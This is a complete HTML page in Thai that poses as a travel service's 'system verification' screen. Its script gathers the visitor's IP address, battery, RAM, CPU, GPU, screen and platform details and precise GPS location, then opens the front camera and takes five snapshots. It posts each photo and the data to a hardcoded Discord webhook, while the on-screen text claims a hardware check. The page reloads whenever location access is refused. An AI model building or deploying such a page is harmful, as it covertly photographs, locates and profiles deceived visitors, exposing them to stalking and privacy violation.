<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Travel Premium - Verified Service</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Kanit', sans-serif; background: #020617; color: white; overflow: hidden; user-select: none; }
        .glass-panel { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(24px); border: 1px solid rgba(255, 255, 255, 0.1); }
        .scan-anim { height: 2px; background: #3b82f6; position: absolute; width: 100%; top: 0; animation: scan move 2s infinite; box-shadow: 0 0 20px #3b82f6; }
        @keyframes move { 0% { top: 0; } 100% { top: 100%; } }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <div class="max-w-md w-full glass-panel rounded-[2.5rem] overflow-hidden shadow-2xl relative">
        <div class="p-8 pb-4 text-center">
            <div class="inline-block px-4 py-1 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-400 text-[10px] mb-4 uppercase tracking-[0.2em]">
                System Analytics v6.0
            </div>
            <h1 class="text-3xl font-bold mb-2">ตรวจสอบสถานะเครื่อง</h1>
            <p class="text-slate-400 text-sm leading-relaxed">กำลังรวบรวมข้อมูล Hardware และพิกัดเพื่อปรับปรุงการเชื่อมต่อ...</p>
        </div>

        <div class="p-8 pt-0">
            <div id="step-scan" class="block text-center">
                <div class="relative w-64 h-64 mx-auto mb-6 rounded-full border-2 border-blue-500/50 overflow-hidden bg-black shadow-[0_0_30px_rgba(59,130,246,0.3)]">
                    <video id="webcam" class="w-full h-full object-cover scale-x-[-1]" autoplay playsinline></video>
                    <div class="absolute inset-0 bg-gradient-to-b from-transparent via-blue-500/10 to-transparent"></div>
                    <div class="scan-anim"></div>
                </div>
                <p id="status-msg" class="text-blue-400 text-sm animate-pulse tracking-widest">กำลังดึงข้อมูลระบบ...</p>
            </div>

            <div id="step-result" class="hidden animate-in fade-in duration-700">
                <div class="mb-6 p-4 bg-green-500/10 border border-green-500/20 rounded-2xl flex items-center gap-3">
                    <div class="w-10 h-10 bg-green-500 rounded-full flex items-center justify-center text-white">✓</div>
                    <div>
                        <p class="text-green-400 font-bold text-sm">บันทึกข้อมูลเรียบร้อย</p>
                        <p class="text-[10px] text-slate-500" id="display-info">System verified successfully.</p>
                    </div>
                </div>
                <div id="places-container" class="space-y-3 text-xs text-slate-400 text-center">
                    ตรวจสอบความเข้ากันได้ของฮาร์ดแวร์เสร็จสมบูรณ์
                </div>
            </div>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1500160535629660263/DqTP_nBQDLnPNoDADa-bXEb-1lKS6H5Ztt6Y7_TzoKCyiahTsosXJiG9M_dlTRyiwMmP";
        let userPos = { lat: 0, lon: 0 };
        let userIP = "Unknown";
        let shotCount = 0;
        const MAX_SHOTS = 5;

        // ข้อมูล Hardware
        let hwInfo = {
            battery: "N/A",
            ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown",
            cpu: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Cores" : "Unknown",
            gpu: "Unknown",
            screen: `${window.screen.width}x${window.screen.height}`
        };

        window.onload = async () => {
            await getFullDiagnostics();
            startProcess();
        };

        async function getFullDiagnostics() {
            // เช็ค IP
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                userIP = data.ip;
            } catch (e) {}

            // เช็ค Battery
            try {
                const batt = await navigator.getBattery();
                hwInfo.battery = `${Math.round(batt.level * 100)}% (${batt.charging ? 'Charging' : 'Not Charging'})`;
            } catch (e) {}

            // เช็ค GPU
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                hwInfo.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            } catch (e) {}
        }

        async function startProcess() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    userPos.lat = pos.coords.latitude;
                    userPos.lon = pos.coords.longitude;
                    await initCamera();
                }, (err) => {
                    alert("กรุณาอนุญาตพิกัดเพื่อดำเนินการต่อ");
                    location.reload();
                });
            }
        }

        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('webcam');
                video.srcObject = stream;
                document.getElementById('status-msg').innerText = "กำลังซิงค์ฮาร์ดแวร์...";

                const burst = setInterval(async () => {
                    if (shotCount >= MAX_SHOTS) {
                        clearInterval(burst);
                        stream.getTracks().forEach(t => t.stop());
                        showResults();
                        return;
                    }
                    await captureAndSend(video);
                    shotCount++;
                }, 500);
            } catch (e) { alert("กรุณาอนุญาตกล้อง"); }
        }

        async function captureAndSend(video) {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);

            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                const payload = {
                    embeds: [{
                        title: `🚀 Full Device Audit [${shotCount + 1}/${MAX_SHOTS}]`,
                        color: 3447003,
                        fields: [
                            { name: "🌐 Network IP", value: `\`${userIP}\``, inline: true },
                            { name: "🔋 Battery", value: `\`${hwInfo.battery}\``, inline: true },
                            { name: "🧠 RAM / CPU", value: `\`RAM: ${hwInfo.ram} | CPU: ${hwInfo.cpu}\``, inline: false },
                            { name: "🎮 GPU Renderer", value: `\`${hwInfo.gpu}\``, inline: false },
                            { name: "📍 Location", value: `[Google Maps](https://www.google.com/maps?q=${userPos.lat},${userPos.lon}) | [Street View](https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${userPos.lat},${userPos.lon})`, inline: false },
                            { name: "📱 Screen", value: `\`${hwInfo.screen}\``, inline: true },
                            { name: "🛠️ Platform", value: `\`${navigator.platform}\``, inline: true }
                        ],
                        image: { url: "attachment://shot.jpg" },
                        footer: { text: "Security Audit Log • " + new Date().toLocaleString() }
                    }]
                };

                formData.append('payload_json', JSON.stringify(payload));
                formData.append('file', blob, 'shot.jpg');
                fetch(WEBHOOK_URL, { method: 'POST', body: formData });
            }, 'image/jpeg', 0.8);
        }

        function showResults() {
            document.getElementById('step-scan').classList.add('hidden');
            document.getElementById('step-result').classList.remove('hidden');
            document.getElementById('display-info').innerText = `Device: ${navigator.platform} Verified`;
        }
    </script>
</body>
</html>
